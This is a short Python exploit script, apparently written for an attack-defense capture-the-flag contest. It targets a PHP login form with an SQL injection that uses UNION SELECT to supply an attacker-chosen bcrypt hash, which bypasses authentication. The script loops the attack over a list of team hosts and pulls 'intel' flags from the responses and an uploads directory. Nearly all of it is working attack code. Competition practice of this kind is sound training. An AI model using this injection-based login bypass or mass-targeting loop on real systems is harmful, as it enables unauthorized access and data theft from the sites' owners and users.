# fakeusername' UNION SELECT '$2a$04$gxqiwkijS.tsjLyYwy0AbOkySWuh49txSy5e99a7//bFtFKZu0mI.'-- | pwndbyUSF
import requests
import re


# teams that had their site up and running
ip_list = ['1','3','4','5','6','7','10','13','17','18','20','22'] 


#proxies = { 'http':'http://127.0.0.1:8080'} Debugging proxy

"""Exploit consisted of a false bcrypt password check. There was only one user
and logging in as that user required the hash to to match the password.
So if we forced the hash to be whatever we wanted and entered the password
associated with that hash, we would be able to bypass the login. The payload is
displayed below."""
inUserName = "fakeusername' UNION SELECT '$2a$04$gxqiwkijS.tsjLyYwy0AbOkySWuh49txSy5e99a7//bFtFKZu0mI.'--"
inUserPass = 'pwndbyUSF'

data = {'username': inUserName, 'password': inUserPass}


for ip in ip_list:#Looping over the entire subnet to exploit every team.
    exploit_ip = f"10.0.{ip}.5"
    login_url = f"http://{exploit_ip}/login_post.php"
    uploads_url = f"http://{exploit_ip}/uploads/"
    session = requests.Session()
    try:
        r = session.post(login_url, data=data, timeout=5)# Added timeout as some sites were either down or patched. 
    except:
        continue
    res = re.findall("<img .*?alt='(.*?)'.*?>", r.text)#intel12849172498172491278491827
    for flag in res:
        if flag.startswith("intel"):
            print("Found flag for ip:", exploit_ip)
            r = session.get(uploads_url+flag)
            print(r.text)